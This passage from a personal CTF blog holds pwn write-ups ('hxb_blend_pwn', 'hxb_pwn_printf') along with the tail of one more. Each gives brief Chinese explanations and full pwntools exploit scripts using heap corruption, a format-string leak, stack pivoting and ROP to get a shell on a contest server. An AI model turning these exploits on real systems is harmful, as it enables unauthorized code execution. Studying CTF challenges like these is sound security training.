class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.ui <span class="keyword">import</span> pause</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', "-h"]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./pwn')</span></span><br><span class="line"><span class="comment"># pelf=ELF('pwn')</span></span><br><span class="line"><span class="comment"># lelf = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'47.111.104.169'</span>, <span class="number">57605</span>)</span><br><span class="line">pelf = ELF(<span class="string">'pwn'</span>)</span><br><span class="line">lelf = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size, data)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    p.recvuntil(<span class="string">"Data:"</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dlt</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice:"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    new(str(<span class="number">0x40</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0xd0</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0x50</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    new(str(<span class="number">0x18</span>), <span class="string">b'a'</span>*<span class="number">0x18</span>+<span class="string">b'\xe1'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0x50</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    new(str(<span class="number">0x18</span>), <span class="string">b'a'</span>*<span class="number">0x18</span>+<span class="string">b'\xe1'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0x50</span>), <span class="number">0x30</span>*<span class="string">b'a'</span>+p64(<span class="number">0xe1</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    new(str(<span class="number">0x18</span>), <span class="string">b'a'</span>*<span class="number">0x18</span>+<span class="string">b'\xe1'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0x30</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0x30</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0x30</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    new(str(<span class="number">0x490</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    new(str(<span class="number">0x420</span>), <span class="string">b'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    payload = (<span class="number">0x60</span><span class="number">-8</span>)*<span class="string">b'a'</span>+p64(<span class="number">0x31</span>)+<span class="string">b'\xb0'</span></span><br><span class="line">    new(str(<span class="number">0xd0</span>), payload)</span><br><span class="line">    new(str(<span class="number">0x20</span>), <span class="string">'aaaa'</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    payload = (<span class="number">0x60</span><span class="number">-8</span>)*<span class="string">b'a'</span>+p64(<span class="number">0x31</span>)+(<span class="number">0x40</span><span class="number">-8</span>)*<span class="string">b'a'</span>+p64(<span class="number">0x31</span>)+<span class="string">b'\x60'</span>+<span class="string">b'\xd7'</span></span><br><span class="line">    new(str(<span class="number">0xd0</span>), payload)</span><br><span class="line">    free()</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># payload=0x</span></span><br><span class="line">    new(str(<span class="number">0xd0</span>), payload)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b'\x00'</span></span><br><span class="line">    new(str(<span class="number">0xd8</span>), payload)</span><br><span class="line"></span><br><span class="line">    addr = p.recvn(len(<span class="string">'\nDone!\n'</span>)).decode()</span><br><span class="line">    <span class="comment"># print('addr:', addr)</span></span><br><span class="line">    <span class="keyword">if</span> addr != <span class="string">'\nDone!\n'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># p=process('./pwn')</span></span><br><span class="line">        p = remote(<span class="string">'47.111.104.169'</span>, <span class="number">57605</span>)</span><br><span class="line"></span><br><span class="line">libc = p.recvuntil(<span class="string">'\xff'</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">print(libc)</span><br><span class="line">libc = u64(libc) - <span class="number">0x3ed8b0</span></span><br><span class="line">print(<span class="string">'libc'</span>, hex(libc))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free()</span></span><br><span class="line">dlt()</span><br><span class="line">p.recvuntil(<span class="string">"Bye"</span>)</span><br><span class="line">rh = lelf.sym[<span class="string">'__realloc_hook'</span>]+libc</span><br><span class="line">og = lelf.sym[<span class="string">'system'</span>]+libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new1</span><span class="params">(size=<span class="number">0</span>, data=<span class="string">''</span>)</span>:</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment"># p.recvuntil("choice:")</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment"># p.recvuntil("Size:")</span></span><br><span class="line">    p.sendline(size)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="comment"># p.recvuntil("Data:")</span></span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free1</span><span class="params">()</span>:</span></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'/bin/sh\0'</span>+<span class="string">b'a'</span>*(<span class="number">0x70</span><span class="number">-8</span>-len(<span class="string">'/bin/sh\0'</span>))+p64(<span class="number">0x31</span>)+p64(rh<span class="number">-8</span>)</span><br><span class="line">new1(str(<span class="number">0xa0</span>), payload)</span><br><span class="line">free1()</span><br><span class="line"></span><br><span class="line">new1(str(<span class="number">0x10</span>), <span class="string">'aaa'</span>)</span><br><span class="line">free1()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'rh'</span>, hex(rh))</span><br><span class="line">print(<span class="string">'og'</span>, hex(og))</span><br><span class="line">new1(str(<span class="number">0x10</span>), <span class="string">b'/bin/sh\0'</span>+p64(og))</span><br><span class="line"></span><br><span class="line">free1()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/05/hxb-blend-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/11/05/hxb-blend-pwn/" class="post-title-link" itemprop="url">hxb_blend_pwn</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-11-05 17:51:47 / Modified: 17:52:54" itemprop="dateCreated datePublished" datetime="2020-11-05T17:51:47+08:00">2020-11-05</time>
            

            
              

              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="blend-pwn"><a href="#blend-pwn" class="headerlink" title="blend_pwn"></a>blend_pwn</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li><p>利用格式化字符串漏洞泄漏程序的基址</p>
</li>
<li><p>申请两个堆块，利用UAF泄漏出堆的地址heap，并且在一个堆块上布置好数据（第三部结束后程序栈会跳到这里来执行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload0 = <span class="number">0x10</span>*<span class="string">b'a'</span>+p64(bss)+p64(rdi)+p64(t+pelf.got[<span class="string">'puts'</span>])+p64(</span><br><span class="line">    t+pelf.plt[<span class="string">'puts'</span>])+p64(rdi)+p64(bss)+p64(wu)+p64(leave)+p64(bss)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>利用栈溢出写入main函数的rbp为heap上的地址，利用try，catch的机制跳转到主函数中的catch执行并绕过canary并且利用之前写入的rbp将栈帧易到我们控制的heap上</p>
</li>
<li><p>利用布置好的数据，获得libc的地址，并且在bss段上（name的位置）写入onegadget地址</p>
</li>
<li><p>利用同样的方法跳转栈帧到bss上，并执行one_gadget获得shell</p>
</li>
</ol>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">puts("\n****************************");</span></span><br><span class="line"><span class="string">  puts("1.Show your name");</span></span><br><span class="line"><span class="string">  puts("2.New note");</span></span><br><span class="line"><span class="string">  puts("3.Delete note");</span></span><br><span class="line"><span class="string">  puts("4.Show note");</span></span><br><span class="line"><span class="string">  puts("5.exit");</span></span><br><span class="line"><span class="string">  return printf("Enter your choice &gt;")</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.ui <span class="keyword">import</span> pause</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">"-h"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("blend_pwn")</span></span><br><span class="line">p = remote(<span class="string">'47.111.104.169'</span>, <span class="number">57804</span>)</span><br><span class="line">elf = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pelf = ELF(<span class="string">"blend_pwn"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sna</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(con)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input note:"</span>)</span><br><span class="line">    p.sendline(con)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dlt</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index&gt;"</span>)</span><br><span class="line">    p.sendline(idx)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sno</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please enter a name: "</span>)</span><br><span class="line">p.sendline(<span class="string">'%7$p'</span>)</span><br><span class="line">sna()</span><br><span class="line">p.recvuntil(<span class="string">"Current user:"</span>)</span><br><span class="line">t = int(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].decode(), <span class="number">16</span>)<span class="number">-0x1266</span></span><br><span class="line">print(hex(t))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">bss = t+<span class="number">0x2020A0</span></span><br><span class="line">rdi = t+<span class="number">0x13b3</span></span><br><span class="line">rsi2 = t+<span class="number">0x13b1</span></span><br><span class="line">main = t+<span class="number">0x1205</span></span><br><span class="line">leave = t+<span class="number">0x12E6</span></span><br><span class="line">fg = t+pelf.got[<span class="string">'free'</span>]</span><br><span class="line">wu=t+<span class="number">0xe22</span></span><br><span class="line">payload0 = <span class="number">0x10</span>*<span class="string">b'a'</span>+p64(bss)+p64(rdi)+p64(t+pelf.got[<span class="string">'puts'</span>])+p64(</span><br><span class="line">    t+pelf.plt[<span class="string">'puts'</span>])+p64(rdi)+p64(bss)+p64(wu)+p64(leave)+p64(bss)</span><br><span class="line"><span class="comment"># print(hex(rdi))</span></span><br><span class="line">print(<span class="string">"wu"</span>,hex(wu))</span><br><span class="line">print(hex(len(payload0)))</span><br><span class="line">pause()</span><br><span class="line">new(payload0)</span><br><span class="line">new(<span class="string">'aaa'</span>)</span><br><span class="line"></span><br><span class="line">dlt(<span class="string">'0'</span>)</span><br><span class="line">dlt(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">sno()</span><br><span class="line">p.recvuntil(<span class="string">'index 2:'</span>)</span><br><span class="line">heap = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'heap'</span>, hex(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.recvuntil(<span class="string">"Enter your choice &gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">'666'</span>)</span><br><span class="line"><span class="comment"># heap=0x64321</span></span><br><span class="line">payload = p64(heap+<span class="number">0x20</span>)*int(<span class="number">0x20</span>/<span class="number">8</span>)+p64(heap+<span class="number">0x20</span>)[:<span class="number">-1</span>]</span><br><span class="line">p.recvuntil(<span class="string">"Please input what you want:"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))-elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">og = libc+<span class="number">0x4527a</span></span><br><span class="line">print(<span class="string">'libc'</span>,hex(libc))</span><br><span class="line">print(<span class="string">'og'</span>, hex(og))</span><br><span class="line">print(<span class="string">'fg'</span>, hex(fg))</span><br><span class="line">print(<span class="string">'bss'</span>,hex(bss))</span><br><span class="line">print(<span class="string">"leave"</span>,hex(leave))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload=p64(bss)+p64(og)+<span class="number">0x60</span>*<span class="string">b'\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/05/hxb-pwn-printf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/11/05/hxb-pwn-printf/" class="post-title-link" itemprop="url">hxb_pwn_printf</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-11-05 17:49:43 / Modified: 17:51:25" itemprop="dateCreated datePublished" datetime="2020-11-05T17:49:43+08:00">2020-11-05</time>
            

            
              

              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="pwn-printf"><a href="#pwn-printf" class="headerlink" title="pwn_printf"></a>pwn_printf</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>程序有一个存在栈溢出的函数vul</p>
<ol>
<li><p>连续输入0x10个30以后，就会进入到vul，此时写入</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b'a'</span>*<span class="number">8</span>+p64(rdi)+p64(pelf.got[<span class="string">'puts'</span>])+p64( pelf.plt[<span class="string">'puts'</span>])+p64(rdi)+p64(<span class="number">0x200</span>)+p64(vul)</span><br></pre></td></tr></table></figure>
<p>payload=b’a’*8+p64(rdi)+p64(pelf.got[‘puts’])+p64( pelf.plt[‘puts’])+p64(rdi)+p64(0x200)+p64(vul)</p>
</li>
</ol>
<p>通过rop设置puts的参数，然后用puts泄漏出libc的地址，然后通过rop重新设置vul写入的长度并跳转会vul</p>
<ol>
<li><p>利用libc地址找到一个onegadget，通过栈溢出跳转执行获得shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b'a'</span>*<span class="number">8</span>+p64(onegadget)+<span class="number">0x200</span>*<span class="string">b'\x00'</span></span><br></pre></td></tr></table></figure>
<p>注意onegadget的条件，rsp+N=NULL，只要一直向后写0就能够满足条件</p>
</li>
</ol>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.ui <span class="keyword">import</span> pause</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">ip: 47.111.104.169</span></span><br><span class="line"><span class="string">port: 56706</span></span><br><span class="line"><span class="string">protocol: tcp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">"-h"</span>]</span><br><span class="line"><span class="comment"># p = process('./pwn_printf')</span></span><br><span class="line">p = remote(<span class="string">'47.111.104.169'</span>, <span class="number">56706</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd = 'b *0x40112E\n'</span></span><br><span class="line">cmd = <span class="string">'b *0x401181\n'</span></span><br><span class="line">cmd += <span class="string">'b *0x4007C6'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,cmd)</span></span><br><span class="line">pelf=ELF(<span class="string">'./pwn_printf'</span>)</span><br><span class="line">lelf = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'You will find this game very interesting\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">    p.sendline(<span class="string">'30'</span>)</span><br><span class="line"></span><br><span class="line">rdi = <span class="number">0x401213</span></span><br><span class="line">rsi_r15 = <span class="number">0x401211</span></span><br><span class="line">vul = <span class="number">0x4007C6</span></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">8</span>+p64(rdi)+p64(pelf.got[<span class="string">'puts'</span>])+p64(pelf.plt[<span class="string">'puts'</span>])+p64(rdi)+p64(<span class="number">0x200</span>)+p64(vul)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts=u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">print(<span class="string">'puts'</span>,hex(puts))</span><br><span class="line">libc = puts<span class="number">-0x06f6a0</span></span><br><span class="line">print(<span class="string">'libc'</span>,hex(libc))</span><br><span class="line"></span><br><span class="line">r = libc+<span class="number">0x0f7310</span></span><br><span class="line">print(<span class="string">'read'</span>, hex(r))</span><br><span class="line"></span><br><span class="line">onegadget = libc+<span class="number">0x4527a</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">8</span>+p64(onegadget)+<span class="number">0x200</span>*<span class="string">b'\x00'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/27/Linux-pwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/10/27/Linux-pwn/" class="post-title-link" itemprop="url">kernel_pwn</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-10-27 19:42:04" itemprop="dateCreated datePublished" datetime="2020-10-27T19:42:04+08:00">2020-10-27</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
